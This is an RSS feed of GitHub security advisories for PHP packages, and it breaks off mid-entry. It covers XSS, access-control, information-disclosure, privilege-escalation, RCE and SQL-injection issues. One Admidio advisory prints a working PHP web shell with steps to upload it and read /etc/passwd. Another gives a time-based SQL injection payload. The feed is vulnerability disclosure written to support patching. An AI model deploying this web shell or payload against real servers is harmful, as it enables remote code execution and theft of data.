<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-07-31T23:01:16.360Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ezsystems/ezplatform-admin-ui] eZ Platform Admin UI vulnerable to DOM-based Cross-site Scripting in file upload widget]]></title>
        <id>https://github.com/advisories/GHSA-gc5h-6jx9-q2qh</id>
        <link href="https://github.com/advisories/GHSA-gc5h-6jx9-q2qh"/>
        <updated>2024-07-31T17:02:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The file upload widget is vulnerable to XSS payloads in filenames. Access permission to upload files is required. As such, in most cases only authenticated editors and administrators will have the required permission. It is not persistent, i.e. the payload is only executed during the upload. In effect, an attacker will have to trick an editor/administrator into uploading a strangely named file. The fix ensures XSS is escaped.</p>
<h3 id="patches">Patches</h3>
<p>See "Patched versions". Commit: <a href="https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b">https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload</a></li>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b">https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b</a></li>
<li><a href="https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59">https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59</a></li>
</ul>
<h3 id="credit">Credit</h3>
<p>This vulnerability was discovered and reported to Ibexa by Alec Romano: <a href="https://github.com/4rdr">https://github.com/4rdr</a>
We thank them for reporting it responsibly to us.</p>
<p>How to report security issues:
<a href="https://doc.ibexa.co/en/latest/infrastructure_and_maintenance/security/reporting_issues/">https://doc.ibexa.co/en/latest/infrastructure_and_maintenance/security/reporting_issues/</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh">https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh</a></li>
<li><a href="https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59">https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59</a></li>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b">https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b</a></li>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload</a></li>
<li><a href="https://github.com/advisories/GHSA-gc5h-6jx9-q2qh">https://github.com/advisories/GHSA-gc5h-6jx9-q2qh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gc5h-6jx9-q2qh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-31T17:01:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ibexa/admin-ui] Ibexa Admin UI vulnerable to DOM-based Cross-site Scripting in file upload widget]]></title>
        <id>https://github.com/advisories/GHSA-qm44-wjm2-pr59</id>
        <link href="https://github.com/advisories/GHSA-qm44-wjm2-pr59"/>
        <updated>2024-07-31T20:20:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The file upload widget is vulnerable to XSS payloads in filenames. Access permission to upload files is required. As such, in most cases only authenticated editors and administrators will have the required permission. It is not persistent, i.e. the payload is only executed during the upload. In effect, an attacker will have to trick an editor/administrator into uploading a strangely named file. The fix ensures XSS is escaped.</p>
<h3 id="patches">Patches</h3>
<p>See "Patched versions". Commit: <a href="https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e">https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload</a></li>
<li><a href="https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e">https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e</a></li>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh">https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh</a></li>
</ul>
<h3 id="credit">Credit</h3>
<p>This vulnerability was discovered and reported to Ibexa by Alec Romano: <a href="https://github.com/4rdr">https://github.com/4rdr</a>
We thank them for reporting it responsibly to us.</p>
<p>How to report security issues:
<a href="https://doc.ibexa.co/en/latest/infrastructure_and_maintenance/security/reporting_issues/">https://doc.ibexa.co/en/latest/infrastructure_and_maintenance/security/reporting_issues/</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh">https://github.com/ezsystems/ezplatform-admin-ui/security/advisories/GHSA-gc5h-6jx9-q2qh</a></li>
<li><a href="https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59">https://github.com/ibexa/admin-ui/security/advisories/GHSA-qm44-wjm2-pr59</a></li>
<li><a href="https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e">https://github.com/ibexa/admin-ui/commit/8dc413fad1045fcfbe65dbcb0bea8516accc4c3e</a></li>
<li><a href="https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-004-dom-based-xss-in-file-upload</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39318">https://nvd.nist.gov/vuln/detail/CVE-2024-39318</a></li>
<li><a href="https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b">https://github.com/ezsystems/ezplatform-admin-ui/commit/7a9f991b200fa5a03d49cd07f50577c8bc90a30b</a></li>
<li><a href="https://github.com/advisories/GHSA-qm44-wjm2-pr59">https://github.com/advisories/GHSA-qm44-wjm2-pr59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qm44-wjm2-pr59</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-31T15:27:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[studio-42/elfinder] Studio 42 elFinder vulnerable to Incorrect Access Control]]></title>
        <id>https://github.com/advisories/GHSA-3h9f-mm2x-4j58</id>
        <link href="https://github.com/advisories/GHSA-3h9f-mm2x-4j58"/>
        <updated>2024-07-30T17:12:00.000Z</updated>
        <content type="html"><![CDATA[<p>Studio 42 elFinder 2.1.64 is vulnerable to Incorrect Access Control. Copying files with an unauthorized extension between server directories allows an arbitrary attacker to expose secrets, perform RCE, etc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38909">https://nvd.nist.gov/vuln/detail/CVE-2024-38909</a></li>
<li><a href="https://github.com/B0D0B0P0T/CVE/blob/main/CVE-2024-38909">https://github.com/B0D0B0P0T/CVE/blob/main/CVE-2024-38909</a></li>
<li><a href="https://github.com/advisories/GHSA-3h9f-mm2x-4j58">https://github.com/advisories/GHSA-3h9f-mm2x-4j58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h9f-mm2x-4j58</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-30T15:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/admin-ui-classic-bundle] Pimcore vulnerable to disclosure of system and database information behind /admin firewall]]></title>
        <id>https://github.com/advisories/GHSA-fx6j-9pp6-ph36</id>
        <link href="https://github.com/advisories/GHSA-fx6j-9pp6-ph36"/>
        <updated>2024-07-30T15:44:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Navigating to <code>/admin/index/statistics</code> with a <strong>logged in Pimcore user</strong> (not an XmlHttpRequest because of this check: <a href="https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/IndexController.php#L125C24-L125C40">IndexController:125</a>) exposes information about the Pimcore installation, PHP version, MYSQL version, installed bundles and all database tables and their row count in the system.</p>
<blockquote>
<p>The web server should not return any product and version information of the components used. The table names and row counts should not be exposed.</p>
</blockquote>
<h3 id="details">Details</h3>
<p><code>/admin/index/statistics</code> returns the following JSON-response:</p>
<pre><code>{
    {
        "instanceId": "...",
        "pimcore_major_version": 11,
        "pimcore_version": "v11.3.1",
        "pimcore_hash": "3ecd39f21dbdd25ffdf4bec6e2c860eccfd3d008",
        "pimcore_platform_version": "v2024.2",
        "php_version": "8.3.8",
        "mysql_version": "10.11.8-MariaDB-ubu2204",
    "bundles": [
        // all installed bundles
    ],
    "tables": [
        // all tables and their row count, e.g:
        {
            "name": "users",
            "rows": 2
        },
    ]
}
</code></pre>
<p>Information about the Pimcore Version can also be seen here:</p>
<p>In a current Version:
<img alt="[image](https://github.com/user-attachments/assets/f0f478da-ceca-4bd5-a391-3fe8458fa3d2)" src="https://github.com/user-attachments/assets/f0f478da-ceca-4bd5-a391-3fe8458fa3d2">
<img alt="[image](https://github.com/user-attachments/assets/152f6ad7-2cb3-42eb-bf05-1066a3496d59)" src="https://github.com/user-attachments/assets/152f6ad7-2cb3-42eb-bf05-1066a3496d59"></p>
<p>In Pimcore Version 10.6.9:
<img alt="[image](https://github.com/user-attachments/assets/907fb8d8-81b3-450f-bdb0-3e6193bfc243)" src="https://github.com/user-attachments/assets/907fb8d8-81b3-450f-bdb0-3e6193bfc243">
<img alt="[image](https://github.com/user-attachments/assets/c4d89b88-f458-4023-a29f-d2ef652b2c3b)" src="https://github.com/user-attachments/assets/c4d89b88-f458-4023-a29f-d2ef652b2c3b"></p>
<h3 id="poc">PoC</h3>
<ul>
<li><a href="https://demo.pimcore.fun/admin"></a><a href="https://demo.pimcore.fun/admin">Demo App</a> with credentials user: admin and pass: demo</li>
<li>Watching Network-Tab in Developer-Tools and looking for <code>/admin/index/statistics</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>Only for logged in Pimcore users possible.</p>
<h3 id="workaround-and-patch">Workaround and Patch</h3>
<p>We patched the following additional check for Pimcore v10.6.9. This uses an app-specific class but any user permission would be ok.
This resolves navigating to <code>/admin/index/statistics</code>.</p>
<pre><code class="language-patch">diff --git a/vendor/pimcore/pimcore/bundles/AdminBundle/Controller/Admin/IndexController.php b/vendor/pimcore/pimcore/bundles/AdminBundle/Controller/Admin/IndexController.php
--- a/vendor/pimcore/pimcore/bundles/AdminBundle/Controller/Admin/IndexController.php    (revision dd81ef4c666b18c254333867a60f6ed455025076)
+++ b/vendor/pimcore/pimcore/bundles/AdminBundle/Controller/Admin/IndexController.php    (date 1721225746781)
@@ -15,6 +15,7 @@

namespace Pimcore\Bundle\AdminBundle\Controller\Admin;

+use App\Constant\UserPermission;
use Doctrine\DBAL\Connection;
use Exception;
use Pimcore\Analytics\Google\Config\SiteConfigProvider;
@@ -142,6 +143,12 @@
throw $this-&gt;createAccessDeniedHttpException();
}

+        $user = $this-&gt;tokenResolver-&gt;getUser();
+
+        if (!$user-&gt;isAdmin() &amp;&amp; !$user-&gt;isAllowed(UserPermission::ADMIN_INDEX_VIEW)) {
+            throw $this-&gt;createAccessDeniedException();
+        }
+
// DB
try {
$tables = $db-&gt;fetchAllAssociative('SELECT TABLE_NAME as name,TABLE_ROWS as `rows` from information_schema.TABLES
</code></pre>
<p>For the Pimcore versions in the UI we used the IndexActionSettingsEvent. This works for Versions &lt; Pimcore 11:</p>
<pre><code class="language-php">&lt;?php

namespace App\EventListener\Admin;

use App\Constant\UserPermission;
use Pimcore\Bundle\AdminBundle\Event\AdminEvents;
use Pimcore\Event\Admin\IndexActionSettingsEvent;
use Pimcore\Security\User\TokenStorageUserResolver;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;

/**
* @deprecated and cannot be used in Pimcore 11
*/
class PimcoreVersionUIGuardSubscriber implements EventSubscriberInterface
{
    public function __construct(private readonly TokenStorageUserResolver $tokenResolver)
    {
    }

    public static function getSubscribedEvents()
    {
        return [
            AdminEvents::INDEX_ACTION_SETTINGS =&gt; ['onIndexActionSettingsEvent'],
        ];
    }

    public function onIndexActionSettingsEvent(IndexActionSettingsEvent $event): void
    {
        $user = $this-&gt;tokenResolver-&gt;getUser();
        if ($user-&gt;isAdmin() || $user-&gt;isAllowed(UserPermission::ADMIN_INDEX_VIEW)) {
            return;
        }

        $settings = $event-&gt;getSettings();
        $settings['instanceId'] = '';
        $settings['version'] = '';
        $settings['build'] = '';
        $event-&gt;setSettings($settings);
    }
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-fx6j-9pp6-ph36">https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-fx6j-9pp6-ph36</a></li>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/commit/afa10bff2f8bfe9c8af7b6b75885bc403f6984f0">https://github.com/pimcore/admin-ui-classic-bundle/commit/afa10bff2f8bfe9c8af7b6b75885bc403f6984f0</a></li>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/IndexController.php#L125C24-L125C40">https://github.com/pimcore/admin-ui-classic-bundle/blob/1.x/src/Controller/Admin/IndexController.php#L125C24-L125C40</a></li>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v1.5.2">https://github.com/pimcore/admin-ui-classic-bundle/releases/tag/v1.5.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41109">https://nvd.nist.gov/vuln/detail/CVE-2024-41109</a></li>
<li><a href="https://github.com/advisories/GHSA-fx6j-9pp6-ph36">https://github.com/advisories/GHSA-fx6j-9pp6-ph36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fx6j-9pp6-ph36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-30T14:52:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[billz/raspap-webgui] RaspAP allows an attacker to escalate privileges]]></title>
        <id>https://github.com/advisories/GHSA-q623-2j2j-23jj</id>
        <link href="https://github.com/advisories/GHSA-q623-2j2j-23jj"/>
        <updated>2024-07-29T17:01:25.000Z</updated>
        <content type="html"><![CDATA[<p>RaspAP before 3.1.5 allows an attacker to escalate privileges: the www-data user has write access to the restapi.service file and also possesses Sudo privileges to execute several critical commands without a password.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41637">https://nvd.nist.gov/vuln/detail/CVE-2024-41637</a></li>
<li><a href="https://blog.0xzon.dev/2024-07-27-CVE-2024-41637">https://blog.0xzon.dev/2024-07-27-CVE-2024-41637</a></li>
<li><a href="https://github.com/RaspAP/raspap-webgui">https://github.com/RaspAP/raspap-webgui</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-2j2j-23jj">https://github.com/advisories/GHSA-q623-2j2j-23jj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-2j2j-23jj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-29T06:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openmage/magento-lts] Magento LTS vulnerable to stored Cross-site Scripting (XSS) in admin system configs]]></title>
        <id>https://github.com/advisories/GHSA-5vrp-638w-p8m2</id>
        <link href="https://github.com/advisories/GHSA-5vrp-638w-p8m2"/>
        <updated>2024-07-29T16:38:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This XSS vulnerability is about the system configs</p>
<ul>
<li>design/header/welcome</li>
<li>design/header/logo_src</li>
<li>design/header/logo_src_small</li>
<li>design/header/logo_alt</li>
</ul>
<p>They are intended to enable admins to set a text in the two cases, and to define an image url for the other two cases.
But because of previously missing escaping allowed to input arbitrary html and as a consequence also arbitrary JavaScript.</p>
<p>While this is in most usage scenarios not a relevant issue, some people work with more restrictive roles in the backend. Here the ability to inject JavaScript with these settings would be an unintended and unwanted privilege.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em>  </p>
<p>The problem is patched with Version 20.10.1 or higher.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>  </p>
<p>Possible mitigations are</p>
<ul>
<li>Restricting access to the System Configs </li>
<li>checking templates where these settings are used to apply proper html filtering</li>
</ul>
<h3 id="for-users-relying-on-this-possibility">For Users relying on this possibility</h3>
<p>Some Users might actually rely on the ability to use html there.
You can restore the previous behavior by making use of the new introduced <code>-&gt;getUnescapedValue()</code> method on this escaped elements. Developers should have a look at the newly introduced <code>Mage_Core_Model_Security_HtmlEscapedString</code></p>
<h3 id="credit">Credit</h3>
<p>Credit goes to  Aakash Adhikari @justlife4x4 for finding this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenMage/magento-lts/security/advisories/GHSA-5vrp-638w-p8m2">https://github.com/OpenMage/magento-lts/security/advisories/GHSA-5vrp-638w-p8m2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41676">https://nvd.nist.gov/vuln/detail/CVE-2024-41676</a></li>
<li><a href="https://github.com/OpenMage/magento-lts/commit/484cf8afc550e98bbf2c03fbb29a8450a32e7948">https://github.com/OpenMage/magento-lts/commit/484cf8afc550e98bbf2c03fbb29a8450a32e7948</a></li>
<li><a href="https://github.com/advisories/GHSA-5vrp-638w-p8m2">https://github.com/advisories/GHSA-5vrp-638w-p8m2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vrp-638w-p8m2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-29T16:38:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[admidio/admidio] Admidio Vulnerable to RCE via Arbitrary File Upload in Message Attachment]]></title>
        <id>https://github.com/advisories/GHSA-g872-jwwr-vggm</id>
        <link href="https://github.com/advisories/GHSA-g872-jwwr-vggm"/>
        <updated>2024-07-29T16:32:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description:</h3>
<p>Remote Code Execution Vulnerability has been identified in the Message module of the Admidio Application, where it is possible to upload a PHP file in the attachment. The uploaded file can be accessed publicly through the URL <code>{admidio_base_url}/adm_my_files/messages_attachments/{file_name}</code>.</p>
<p>The vulnerability is caused due to the lack of file extension verification, allowing malicious files to be uploaded to the server and public availability of the uploaded file.</p>
<p>An attacker can upload a PHP web shell that executes OS commands on the server, compromising the application server.</p>
<p>Note: I am using the docker-compose.yaml file from <a href="https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage">https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage</a> official documentation.</p>
<h3 id="impact">Impact:</h3>
<p>An attacker can exploit this flaw to upload a PHP web shell, which can be used to execute arbitrary commands on the server. This can lead to a complete compromise of the application server, allowing the attacker to:</p>
<ul>
<li>Execute arbitrary code or commands.</li>
<li>Access, modify, or delete sensitive data.</li>
<li>Install malicious software or scripts.</li>
<li>Gain further access to internal networks.</li>
<li>Disrupt services and applications hosted on the server.</li>
</ul>
<h3 id="recommendation">Recommendation:</h3>
<ul>
<li>Implement strict file extension verification to ensure that only allowed file types (e.g., images, documents) can be uploaded.</li>
<li>Reject any file upload with disallowed or suspicious extensions such as .php, .phtml, .exe, etc.</li>
</ul>
<h3 id="steps-to-reproduce">Steps to Reproduce:</h3>
<ol>
<li>As a member user, go to write an email message.</li>
<li>Upload a PHP file in the Attachment, containing the following content:</li>
</ol>
<pre><code>&lt;?php
$command = isset($_GET['command']) ? $_GET['command'] : '';
$output = [];
$return_var = 0;
exec($command, $output, $return_var);
echo '&lt;h1&gt;Exploiting RCE&lt;/h1&gt;';
echo 'Command: '.$command;
echo '\n&lt;pre&gt;';
echo implode("\n", $output);
echo '&lt;/pre&gt;';
?&gt;
</code></pre>
<ol start="3">
<li>Send the email.</li>
<li>In the message history go to the sent message.</li>
<li>Download the file, to get the uploaded file name.</li>
<li>Go to the following URL: 
<code>{admidio_base_url}/adm_my_files/messages_attachments/{file_name}?command=cat+/etc/passwd</code></li>
<li>The server's passwd file would be returned in the response.</li>
</ol>
<h3 id="proof-of-concept">Proof Of Concept:</h3>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/51b524de-ec51-4875-80e9-e2037da9c573"></p>
<p><em>Figure 1: Code of messages_send.php, not having file extension verification.</em></p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/74b47e6d-e2e9-4535-82e3-d6ad2f677361"></p>
<p><em>Figure 2: Uploading Webshell as attachment.</em></p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/abea26eb-b36f-46db-9e3a-8a4ba82d9740"></p>
<p><em>Figure 3: Download the uploaded file to get the uploaded file name.</em></p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/fbb14aae-d5c6-454b-bafa-8d03d6d8a208"></p>
<p><em>Figure 4: Uploaded File name.</em></p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/f8436248-1768-4714-ad2d-87f157145c61"></p>
<p><em>Figure 5: RCE via web shell.</em></p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/edc5b992-227f-43f9-bef9-87959766a63c"></p>
<p><em>Figure 6: RCE via Webshell.</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Admidio/admidio/security/advisories/GHSA-g872-jwwr-vggm">https://github.com/Admidio/admidio/security/advisories/GHSA-g872-jwwr-vggm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38529">https://nvd.nist.gov/vuln/detail/CVE-2024-38529</a></li>
<li><a href="https://github.com/Admidio/admidio/commit/3b1cc1cda05747edebe15f2825b79bc5a673d94c">https://github.com/Admidio/admidio/commit/3b1cc1cda05747edebe15f2825b79bc5a673d94c</a></li>
<li><a href="https://github.com/advisories/GHSA-g872-jwwr-vggm">https://github.com/advisories/GHSA-g872-jwwr-vggm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g872-jwwr-vggm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-29T16:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[admidio/admidio] Admidio has Blind SQL Injection in ecard_send.php]]></title>
        <id>https://github.com/advisories/GHSA-69wx-xc6j-28v3</id>
        <link href="https://github.com/advisories/GHSA-69wx-xc6j-28v3"/>
        <updated>2024-07-29T16:31:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description:</h3>
<p>An SQL Injection has been identified in the <code>/adm_program/modules/ecards/ecard_send.php</code> source file of the Admidio Application. The SQL Injection results in a compromise of the application's database. The value of <code>ecard_recipients </code>POST parameter is being directly concatenated with the SQL query in the source code causing the SQL Injection.</p>
<p>The SQL Injection can be exploited by a member user, using blind condition-based, time-based, and Out of band interaction SQL Injection payloads. I successfully exploited SQL Injections by causing Time Delays. Advancing the payload, I was able to exfiltrate data from the database based on trial and error conditions and step-wise enumerating the characters of the database name. This was done as a POC of SQL Injection. An attacker could simply drop the database by providing a single payload, steal data, and potentially update the database according to their will. </p>
<h3 id="impact">Impact:</h3>
<p>SQL injection (SQLi) vulnerabilities can have serious consequences for the security of a web application and its underlying database. Attackers can use SQLi to access sensitive data, and modify, delete, or add data to the database. SQLi can also be potentially used to perform RCE. </p>
<h3 id="remediation">Remediation:</h3>
<p>Use parameterized queries or prepared statements instead of concatenating user input directly into SQL queries. Parameterized queries ensure that user input is treated as data and not executable queries. 
OR 
Sanitize the input before including it in the SQL Query.</p>
<h3 id="steps-to-reproduce">Steps to Reproduce:</h3>
<ul>
<li>Intercept the POST request to <code>/adm_program/modules/ecards/ecard_send.php</code>, which is used to send photo as greeting card.</li>
<li>Change the value of <code>ecard_recipients%5B%5D</code> POST parameter to <code>2%2bsleep(10)</code>.</li>
<li>Sending the request will cause a time delay.</li>
</ul>
<h3 id="proof-of-concept">Proof Of Concept:</h3>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/8ea87f4f-dad0-4df1-999d-212b07e02527">
Figure 1: Code Vulnerable to SQL Injection</p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/d803a92c-3469-45aa-a844-e8aa311b55f4">
Figure 2: Code Vulnerable to SQL Injection</p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/2ccdf865-2867-4dc8-abe1-f25b5e906db3">
Figure 3: SQLi to trigger time delay</p>
<p><img alt="image" src="https://github.com/Admidio/admidio/assets/59286712/eed06ce6-6591-427f-b98e-5314233b5996">
Figure 4: Data Exfiltration via Condition-based Time Delays</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Admidio/admidio/security/advisories/GHSA-69wx-xc6j-28v3">https://github.com/Admidio/admidio/security/advisories/GHSA-69wx-xc6j-28v3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37906">https://nvd.nist.gov/vuln/detail/CVE-2024-37906</a></li>
<li><a href="https://github.com/Admidio/admidio/commit/3ff02b0c64a6911ab3e81cd61077f392c0b25248">https://github.com/Admidio/admidio/commit/3ff02b0c64a6911ab3e81cd61077f392c0b25248</a></li>
<li><a href="https://github.com/advisories/GHSA-69wx-xc6j-28v3">https://github.com/advisories/GHSA-69wx-xc6j-28v3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69wx-xc6j-28v3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-29T16:31:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oveleon/contao-cookiebar] Reflected Cross Site-Scripting (XSS) in Oveleon Cookiebar]]></title>
        <id>https://github.com/advisories/GHSA-296q-rj83-g9rq</id>
        <link href="https://github.com/advisories/GHSA-296q-rj83-g9rq"/>
        <updated>2024-07-26T14:28:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="usd-2024-0009--reflected-xss-in-oveleon-cookiebar">usd-2024-0009 | Reflected XSS in Oveleon Cookiebar</h2>
<h3 id="details">Details</h3>
<p><strong>Advisory ID</strong>: usd-2024-0009 
<strong>Product</strong>: Cookiebar<br><strong>Affected Version</strong>: 2.X<br><strong>Vulnerability Type</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')<br><strong>Security Risk</strong>: HIGH, CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N<br><strong>Vendor URL</strong>: <a href="https://www.usd.de/">https://www.usd.de/</a><br><strong>CVE Number</strong>: Not requested yet<br><strong>CVE Link</strong>: Not requested yet    </p>
<h3 id="affected-component">Affected Component</h3>
<p>The <code>block</code> function in <code>CookiebarController.php</code>.</p>
<h3 id="desciption">Desciption</h3>
<p>Oveleon's Cookiebar is an extension for the popular Contao CMS.
The <code>block/locale</code> endpoint does not properly sanitize the user-controlled <code>locale</code> input before including it in the backend's HTTP response, thereby causing reflected XSS.</p>
<h3 id="fix">Fix</h3>
<p>Sanitize the <code>locale</code> input to prevent XSS payloads from being executed in a user's browser.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li><p><strong>2024-04-24</strong>: Vulnerability discovered by Daniel Ruppel of usd AG.</p>
</li>
<li><p><strong>2024-07-25</strong>: Probable cause of the vulnerability has been identified as Oveleon's Cookiebar Extension for Contao CMS.</p>
</li>
<li><p><strong>2024-07-25</strong>: Vulnerability disclosed via GitHub Vulnerability Report.</p>
</li>
</ul>
<h3 id="references">References</h3>
